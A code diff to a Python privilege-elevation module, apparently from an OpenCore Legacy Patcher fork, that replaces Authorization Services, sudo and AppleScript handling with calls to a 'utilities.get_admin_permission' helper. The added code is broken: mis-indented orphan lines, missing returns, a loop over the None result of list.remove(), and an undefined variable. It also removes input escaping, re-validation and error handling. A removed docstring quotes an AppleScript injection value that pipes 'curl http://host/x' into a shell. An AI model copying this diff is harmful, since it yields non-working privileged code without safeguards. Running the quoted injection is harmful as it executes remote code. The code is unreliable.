@@ -8,10 +8,10 @@ import stat
 import shlex
 import logging
 import subprocess
-import Security
 import os
 import atexit
 import threading
+from . import utilities
 
 from pathlib import Path
 from typing import Callable, Optional
@@ -184,140 +184,28 @@ def privileged_helper_needs_setuid_repair() -> bool:
 
 
 def repair_privileged_helper_permissions() -> bool:
-    """
-    Reset the Privileged Helper Tool back to 4755 using the Security framework,
-    which is supported on macOS 10.0+, that easily fits with 10.10!
 
-    Note: Deliberately does NOT go through run_as_root() (i.e. the helper
-    tool itself), since a helper tool missing its setuid bit can't elevate
-    itself - that's precisely the problem being repaired here.
-
-    Callers may assume a single contract: this returns True on success and False
-    on ANY failure (user cancelled, Authorization Services error, unexpected
-    exception). It never raises and never terminates the process - it is called
-    from the GUI, where killing the interpreter mid-run could leave a half-written
-    EFI behind.
-
-    AuthorizationExecuteWithPrivileges has been deprecated since macOS 10.7 and is
-    unavailable from sandboxed contexts; SMJobBless/SMAppService is the sanctioned
-    replacement. Kept for now because it works on the wide OS range this fork targets.
-    """
-    if not _helper_path_is_safe_to_repair():
-        # Should already have been caught by privileged_helper_needs_setuid_repair(),
-        # re-checked here so this stays safe if called directly.
-        return False
-
-    # Authorize the privileged operation using macOS Authorization Services.
-    # This causes macOS to present its native authorization UI rather than
-    # requiring OCLP to collect an administrator password.
-    # MARK: IMPORTANT
-
-    # If this doesn't work make sure that you have pyObjC 12.1, as that was version that has been tested.
-    status, auth_ref = Security.AuthorizationCreate(
-        None,
-        None,
-        Security.kAuthorizationFlagDefaults,
-        None
-    )
-
-    if status != Security.errAuthorizationSuccess:
-        logging.error(f"AuthorizationCreate failed with status {status}")
-        return False
-
-    try:
-        # Request the right to execute a privileged tool.
-        rights = (
-            Security.AuthorizationItem(
-                Security.kAuthorizationRightExecute,
-                0,
-                None,
-                0
-            ),
-        )
-        prompt = b"OpenCore Legacy Patcher T2 needs administrator permission to repair the permissions of its privileged helper tool."
-
-        environment = (
-            Security.AuthorizationItem(
-                Security.kAuthorizationEnvironmentPrompt,
-                len(prompt),
-                prompt,
-                0
-            ),
-        )
-
-        status, authorized_rights = Security.AuthorizationCopyRights(
-            auth_ref,
-            rights,
-            environment,
-            (
-                Security.kAuthorizationFlagInteractionAllowed
-                | Security.kAuthorizationFlagExtendRights
-            ),
-            None,
-        )
-
-        if status == Security.errAuthorizationCanceled:
-            logging.info("User canceled the request")
-            return False
-
-        if status != Security.errAuthorizationSuccess:
-            logging.error(f"AuthorizationCopyRights failed with status {status}")
-            return False
-
-        # Re-validate immediately before the chmod to narrow the TOCTOU window between
-        # the check above and the privileged operation itself. This does not close the
-        # window (chmod still resolves the path itself), it only shrinks it.
         if not _helper_path_is_safe_to_repair():
             return False
 
-        chmod_arguments = (
-            oct(OCLP_PRIVILEGED_HELPER_EXPECTED_MODE)[2:].encode("utf-8"),
-            OCLP_PRIVILEGED_HELPER.encode("utf-8"),
-        )
+        prompt = b"OpenCore Legacy Patcher T2 needs administrator permission to repair the permissions of its privileged helper tool."
 
-        status, _ = Security.AuthorizationExecuteWithPrivileges(
-            auth_ref,
-            b"/bin/chmod",
-            Security.kAuthorizationFlagDefaults,
-            chmod_arguments,
-            None,
-        )
-
-        if status == Security.errAuthorizationCanceled:
-            logging.info("User canceled the request")
-            return False
-
-        if status != Security.errAuthorizationSuccess:
-            logging.error(f"AuthorizationExecuteWithPrivileges failed with status {status}")
-            return False
-
-        logging.info("Privileged Helper Tool permissions repaired (4755)")
-        return True
-
-    # Ohne diesen Block wurde eine unerwartete Exception (z.B. ein PyObjC-Fehler bei
-    # abweichender pyObjC-Version) ungefangen bis in den GUI-Aufrufer durchgereicht.
-    # Jetzt: protokollieren und False zurueckgeben, damit der Aufrufer einen einzigen,
-    # vorhersehbaren Fehlerfall behandeln muss.
-    except Exception:
-        logging.error("Running the Privileged Helper Tool operation failed.")
-        logging.exception("Stack Trace:")
-        return False
-
-    finally:
-        Security.AuthorizationFree(
-           auth_ref,
-           Security.kAuthorizationFlagDefaults
+        utilities.get_admin_permission(
+            action=[b"/bin/chmod", f"{oct(OCLP_PRIVILEGED_HELPER_EXPECTED_MODE)[2:]} {OCLP_PRIVILEGED_HELPER}".encode("utf-8")],
+            reason=prompt,
+            # the defaults for the buttons are ok, so we would touch them
         )
 
 
-def run(*args, **kwargs) -> subprocess.CompletedProcess:
+
+def run(*args, **kwargs):
     """
     Basic subprocess.run wrapper.
     """
     return subprocess.run(*args, **kwargs)
 
 
-def run_as_root(*args, **kwargs) -> subprocess.CompletedProcess:
+def run_as_root(*args, **kwargs):
     """
     Run subprocess as root.
 
@@ -371,300 +259,12 @@ def run_as_root(*args, **kwargs) -> subprocess.CompletedProcess:
             logging.error(f"Privileged Helper Tool failed ({_helper_error}).")
     elif not Path(OCLP_PRIVILEGED_HELPER).exists():
         logging.warning(f"Privileged Helper Tool not found at {OCLP_PRIVILEGED_HELPER}.")
+    args=""
+    for arg in kwargs:
+        args+=f"{arg} "
 
-    return _run_elevated_without_helper(_command, **kwargs)
+    return utilities.get_admin_permission(action=_command, args=f"{kwargs}")
 
-
-def _run_elevated_without_helper(command: list, **kwargs) -> subprocess.CompletedProcess:
-    """
-    Elevate a command when the Privileged Helper Tool cannot be used.
-
-    Prefers sudo fed from the session credential cache, so the user is asked for the
-    administrator password once per session rather than once per command (Issue #356).
-    Only if no usable password could be obtained that way - e.g. the account is not in
-    sudoers, or the plain password dialog could not be shown - does it fall back to
-    osascript, whose native prompt also accepts a different administrator's name.
-    """
-    password = obtain_admin_password()
-    if password is None:
-        if _admin_password_cancelled:
-            logging.info("Administrator password prompt cancelled, not running privileged command")
-            return subprocess.CompletedProcess(args=command, returncode=1, stdout=b"", stderr=b"User cancelled administrator authentication")
-        logging.warning("No usable administrator password for sudo, falling back to osascript")
-        return osascript(command, **kwargs)
-    return _run_with_sudo(command, password, **kwargs)
-
-
-def _run_with_sudo(command: list, password: str, **kwargs) -> subprocess.CompletedProcess:
-    """
-    Run 'command' through 'sudo -S', supplying the cached password on stdin.
-
-    '-k' makes sudo ignore any timestamp, so it always consumes exactly the one password
-    line we send (or none, when sudoers says NOPASSWD and 'password' is ""), and '-p ""'
-    keeps its prompt out of the command's stderr. The command itself then sees EOF on
-    stdin, which matches what it got from the helper/osascript paths.
-    """
-    if "input" in kwargs or "stdin" in kwargs:
-        # Would collide with the password line; no current caller does this.
-        raise ValueError("run_as_root() does not support stdin/input when elevating via sudo")
-
-    payload = (password + "\n") if password else ""
-    text_mode = bool(kwargs.get("text") or kwargs.get("universal_newlines") or kwargs.get("encoding") or kwargs.get("errors"))
-    sudo_input = payload if text_mode else payload.encode()
-
-    result = subprocess.run(
-        ["/usr/bin/sudo", "-S", "-k", "-p", "", "--"] + [str(arg) for arg in command],
-        input=sudo_input,
-        **kwargs
-    )
-    # Report the command as the caller wrote it, not the sudo wrapper (keeps logs readable
-    # and never includes anything password-related).
-    result.args = command
-    return result
-
-
-def _admin_password_is_valid(password: str) -> bool:
-    """Check a password against sudo without running anything ('sudo -v')."""
-    try:
-        result = subprocess.run(
-            ["/usr/bin/sudo", "-S", "-k", "-p", "", "-v"],
-            input=(password + "\n").encode(),
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=30
-        )
-    except Exception as error:
-        logging.error(f"Could not validate administrator password: {error}")
-        return False
-    return result.returncode == 0
-
-
-def set_admin_prompt_icon(icon_path) -> None:
-    """Icon used by the session's administrator password dialog."""
-    global _admin_prompt_icon_path
-    if icon_path:
-        _admin_prompt_icon_path = icon_path
-
-
-def obtain_admin_password(admin_password_prompt: Optional[Callable[..., str]] = None) -> Optional[str]:
-    """
-    Return an administrator password usable with 'sudo -S', asking at most once per session.
-
-    Returns:
-        str:  the validated password, or "" if sudo does not need one (NOPASSWD).
-        None: none available - the user cancelled (see _admin_password_cancelled) or
-              every attempt failed validation / the dialog could not be shown.
-
-    'admin_password_prompt' lets callers supply their own dialog; it is called with a
-    'message' keyword argument and returns the entered password ("" on cancel). Only a password sudo accepted is cached, so a
-    typo is re-asked right away instead of failing every later command.
-    """
-    global _cached_admin_password, _admin_password_cancelled, _sudo_elevation_failed
-
-    with _admin_session_lock:
-        if _cached_admin_password is not None:
-            return _cached_admin_password
-
-        if _sudo_elevation_failed:
-            _admin_password_cancelled = False
-            return None
-
-        if not _sudo_will_prompt():
-            _cached_admin_password = ""
-            return _cached_admin_password
-
-        for attempt in range(ADMIN_PASSWORD_MAX_ATTEMPTS):
-            message = ADMIN_PASSWORD_PROMPT_MESSAGE if attempt == 0 else ADMIN_PASSWORD_RETRY_MESSAGE
-            if admin_password_prompt is None:
-                password = request_admin_password(_admin_prompt_icon_path, message=message)
-            else:
-                password = admin_password_prompt(message=message)
-
-            if not password:
-                _admin_password_cancelled = True
-                return None
-
-            if _admin_password_is_valid(password):
-                _admin_password_cancelled = False
-                _cached_admin_password = password
-                logging.info("Administrator password accepted, reusing it for this session")
-                return _cached_admin_password
-
-            logging.info(f"Administrator password rejected by sudo (attempt {attempt + 1}/{ADMIN_PASSWORD_MAX_ATTEMPTS})")
-
-        _admin_password_cancelled = False
-        _sudo_elevation_failed = True
-        return None
-
-
-def clear_cached_admin_password() -> None:
-    """Forget the session's administrator password."""
-    global _cached_admin_password, _admin_password_cancelled, _sudo_elevation_failed
-    with _admin_session_lock:
-        _cached_admin_password = None
-        _admin_password_cancelled = False
-        _sudo_elevation_failed = False
-
-
-atexit.register(clear_cached_admin_password)
-
-
-def osascript(cmd_args, **kwargs) -> subprocess.CompletedProcess:
-    """
-    Elevate via AppleScript's "do shell script ... with administrator privileges".
-
-    Nur als Fallback gedacht: dieser Pfad fragt den Benutzer nach einem Admin-Passwort,
-    statt den Helper zu benutzen. Ein Angreifer, der den Helper unbrauchbar macht
-    (loeschen, Rechte zerstoeren), kann OCLP damit in diesen Pfad zwingen und dem
-    Benutzer einen erwarteten Passwort-Prompt praesentieren - das ist eine
-    Phishing-Oberflaeche, keine Codeausfuehrung. Deshalb wird oben beim
-    fehlgeschlagenen Repair bewusst NICHT hierher zurueckgefallen.
-
-    Der Parametername ist 'cmd_args' und nicht 'args': die urspruengliche Fassung
-    referenzierte ein nicht existierendes 'args' und loeste NameError aus.
-    """
-    cmd_string = shlex.join(str(arg) for arg in cmd_args)
-    # Newlines cannot appear inside an AppleScript string literal at all, so a command
-    # containing them is rejected outright rather than producing a syntactically broken
-    # script. Everything else is escaped by applescript_quote() below.
-    if "\n" in cmd_string or "\r" in cmd_string:
-        raise ValueError("Refusing to build AppleScript from a command containing newlines")
-    apple_script = f'do shell script "{applescript_quote(cmd_string)}" with administrator privileges'
-    return subprocess.run(["/usr/bin/osascript", "-e", apple_script], **kwargs)
-
-
-def applescript_quote(value) -> str:
-    """
-    Escape a value for interpolation into an AppleScript string literal.
-
-    AppleScript is compiled, not handed to a shell, so passing the script through
-    osascript -e argv (or py-applescript) does NOT protect against a value that
-    contains a double quote: the quote closes the literal and everything after it
-    is parsed as code. A value such as
-
-        1.0" & (do shell script "curl http://host/x | sh") & "
-
-    turns a 'display dialog' into arbitrary command execution. Every value that is
-    interpolated into an AppleScript source string must go through here first.
-
-    Backslashes are escaped before quotes (order matters, or the escape character
-    itself gets doubled twice), and CR/LF become the AppleScript escape sequences,
-    since a raw newline cannot appear inside an AppleScript string literal.
-
-    Parameters:
-        value: Value to escape. Cast to str, so None/int callers are safe.
-
-    Returns:
-        str: The escaped text, without the surrounding quotes.
-    """
-    text = str(value)
-    text = text.replace("\\", "\\\\").replace('"', '\\"')
-    text = text.replace("\r", "\\r").replace("\n", "\\n")
-    return text
-
-
-def applescript_icon_clause(icon_path) -> str:
-    """
-    Build the 'with icon POSIX file "..."' fragment for a 'display dialog' call.
-
-    Two things this deliberately does NOT do, both of which used to break dialogs:
-
-      1. It does not hand AppleScript an HFS path. The previous form,
-         str(icon_path).replace("/", ":")[1:], produced "Users:me:...icns" - an HFS
-         path whose first component is read as the VOLUME name, so it resolved
-         against a non-existent volume "Users". 'with icon POSIX file "/Users/..."'
-         takes the POSIX path as-is.
-      2. It does not reference a file that isn't there. A missing icon makes
-         'display dialog' raise, and every caller here wraps that in a try/except -
-         so a cosmetic problem silently swallows the whole dialog. Where that dialog
-         is how we collect an administrator password, the result is a mount that
-         fails with no prompt ever shown. Returning an empty clause loses the icon
-         and keeps the dialog.
-
-    Returns:
-        str: the clause including its leading space, or "" if no usable icon exists.
-    """
-    try:
-        path = Path(icon_path)
-        if not path.is_file():
-            logging.warning(f"Dialog icon missing, continuing without it: {path}")
-            return ""
-    except Exception:
-        return ""
-
-    # A quote or backslash would break out of the AppleScript string literal.
-    # Nothing in our own bundle contains either; drop the icon rather than
-    # building a script we cannot escape correctly.
-    if '"' in str(path) or "\\" in str(path):
-        logging.warning("Dialog icon path contains characters that cannot be quoted, continuing without it")
-        return ""
-
-    return f' with icon POSIX file "{path}"'
-
-
-def request_admin_password(icon_path=None, message: str = ADMIN_PASSWORD_PROMPT_MESSAGE) -> str:
-    """
-    Prompt for the local administrator password via a plain dialog.
-
-    Deliberately NOT routed through "do shell script ... with administrator
-    privileges": that mechanism runs the elevated command via
-    /usr/libexec/security_authtrampoline, a process detached from the current
-    login/Aqua session. hdiutil's own internal authentication (DIHelperAgentMaster)
-    appears to depend on that session being present, so a hdiutil invocation
-    elevated via the trampoline can fail with "hdiutil: attach failed -
-    Authentication error" even though the same command run under sudo from a
-    session-bound process succeeds. A plain "display dialog" only needs a
-    WindowServer session to render, so we use it purely to collect the password
-    and feed it to sudo ourselves.
-
-    A failure to even show the dialog is logged rather than swallowed: silently
-    returning "" here reads downstream as "user cancelled" and aborts elevation,
-    which previously turned any dialog problem into an unexplained mount failure.
-
-    Returns:
-        str: the password, or "" if cancelled or the dialog could not be shown.
-    """
-    import applescript
-
-    script = (
-        f'set theResult to display dialog "{applescript_quote(message)}" default answer "" with hidden answer '
-        f'with title "OpenCore Legacy Patcher"{applescript_icon_clause(icon_path)}\n'
-        'return the text returned of theResult'
-    )
-
-    try:
-        return applescript.AppleScript(script).run() or ""
-    except Exception as error:
-        # -128 is AppleScript's "User canceled" - expected, not a fault.
-        if "-128" in str(error):
-            logging.info("Administrator password prompt cancelled by user")
-        else:
-            logging.error(f"Failed to display administrator password prompt: {error}")
-        return ""
-
-
-def _sudo_will_prompt() -> bool:
-    """
-    Whether 'sudo -k' would actually ask for a password on this machine.
-
-    Matters because mount_dmg() feeds sudo and hdiutil from the same stdin: the
-    first line is consumed by sudo's prompt, the rest is handed to hdiutil's
-    -stdinpass. If sudo does not prompt (a NOPASSWD sudoers rule - which '-k' does
-    NOT override, it only clears the credential timestamp), that first line falls
-    through to hdiutil and is tried as the image passphrase, producing an
-    authentication failure that looks nothing like its actual cause.
-
-    Returns:
-        bool: True if a password line should be sent, False if sudo runs unprompted.
-    """
-    try:
-        result = subprocess.run(
-            ["/usr/bin/sudo", "-k", "-n", "-v"],
-            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=15
-        )
-    except Exception:
-        # Assume a prompt: sending a password line sudo did not want is recoverable
-        # via the caller's retry, withholding one it did want hangs on EOF.
-        return True
-    return result.returncode != 0
 
 
 def mount_dmg(
@@ -741,47 +341,10 @@ def mount_dmg(
         return subprocess.CompletedProcess(args=cmd, returncode=process.returncode, stdout=stdout)
 
     logging.info("- Unprivileged hdiutil attach failed, retrying with administrator privileges")
-
-    # Shared with run_as_root(): the user is asked once per session, not once per image.
-    admin_password = obtain_admin_password(admin_password_prompt)
-    if admin_password is None:
-        logging.info("- Elevated hdiutil attach cancelled (no administrator password provided)")
-        return subprocess.CompletedProcess(args=cmd, returncode=process.returncode, stdout=stdout)
-    _needs_admin_password = admin_password != ""
-
-    # Clear com.apple.quarantine before attaching: a quarantined disk image (e.g. a
-    # freshly rebuilt/re-extracted payload) can trip hdiutil's authentication gate
-    # even when run as root - elevating privileges alone does not clear it. Run it
-    # in the same elevated shell as the actual attach so it always has the rights to.
-    elevated_shell = (
-        # sudo resets the environment (env_reset), so LC_ALL and AppleLanguages set
-        # for the unprivileged attempt do not survive into this one. Re-export them here.
-        "export LC_ALL=C LANG=en_US.UTF-8 AppleLanguages='(\"en\")'; "
-        f"xattr -d com.apple.quarantine {shlex.quote(str(dmg_path))} 2>/dev/null; "
-        + " ".join(shlex.quote(str(arg)) for arg in cmd)
-    )
-    # '-k' clears any cached sudo credential timestamp, so a previous sudo in this
-    # session cannot silently change how much of stdin sudo consumes. It does NOT
-    # force a prompt where sudoers says NOPASSWD - that case is handled by asking
-    # sudo up front (_sudo_will_prompt) and sending no password line at all.
-    elevated_cmd = ["/usr/bin/sudo", "-S", "-k", "-p", "", "/bin/sh", "-c", elevated_shell]
-
-    elevated_process = subprocess.Popen(elevated_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env)
-    # sudo -S reads exactly one line from stdin for its own password, then hands the
-    # remaining, still-open stdin through to the shell (and on to hdiutil's -stdinpass)
-    stdin_payload = (admin_password + "\n" if _needs_admin_password else "") + (password or "")
-    elevated_stdout, _ = elevated_process.communicate(input=stdin_payload.encode())
-
-    if elevated_process.returncode == 0:
-        logging.info("- Mounted (elevated)")
-        return subprocess.CompletedProcess(args=cmd, returncode=0, stdout=elevated_stdout)
-
-    # Der Fehlertext wird protokolliert, damit ein Fehlschlag im CLI-Betrieb ueberhaupt
-    # sichtbar ist. Bewusst als einzelne Zeile und ohne Sonderbehandlung: die Ausgabe
-    # landet in Logs, die Nutzer routinemaessig an Issues anhaengen, enthaelt Pfade und
-    # kann je nach hdiutil-Fehlerfall Reste der stdin-Eingabe spiegeln.
-    logging.error(f"- Elevated hdiutil attach failed: {elevated_stdout.decode(errors='replace').strip()}")
-    return subprocess.CompletedProcess(args=cmd, returncode=elevated_process.returncode, stdout=elevated_stdout)
+    args=""
+    for arg in cmd.remove(cmd[0]):
+        args+= f"{arg} "
+    utilities.get_admin_permission(action=cmd[0], args=arg, reason=admin_password_prompt)
 
 
 def verify(process_result: subprocess.CompletedProcess) -> None:
